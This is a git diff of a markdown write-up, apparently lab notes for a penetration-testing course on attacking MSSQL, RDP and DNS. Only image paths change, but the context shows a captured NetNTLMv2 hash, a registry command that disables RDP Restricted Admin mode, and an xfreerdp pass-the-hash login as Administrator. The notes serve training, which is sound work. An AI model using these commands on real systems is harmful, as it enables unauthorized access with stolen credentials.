@@ -32,7 +32,7 @@ What is the password for the "mssqlsvc" user?
 
 `mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:5a04b004fa4e9d85f6186628bbb5f628:0101000000000000800f5b3cd1a9d9013832986d3a5b90e8000000000100100045006c0046004800450079006a0061000300100045006c0046004800450079006a006100020010006d007100780051006100480062004900040010006d00710078005100610048006200490007000800800f5b3cd1a9d90106000400020000000800300030000000000000000000000000300000205c323361b6fee9491d3dade42cd1a0ade509215af472deb6f497f224759ddc0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000`
 
-<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure>
 
 Enumerate the "flagDB" database and submit a flag as your answer.
 
@@ -62,13 +62,13 @@ Connect via RDP with the Administrator account and submit the flag.txt as you an
 
 1. `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
 2. `xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /dynamic-resolution`
-3. ![](<../../.gitbook/assets/image (8) (1) (1).png>)
+3. ![](<../../.gitbook/assets/image (8) (1).png>)
 
 ### DNS
 
 Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.
 
-<figure><img src="../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * used subbrute to enum the subdomain.
 * found hr.inlanefreight.htb.
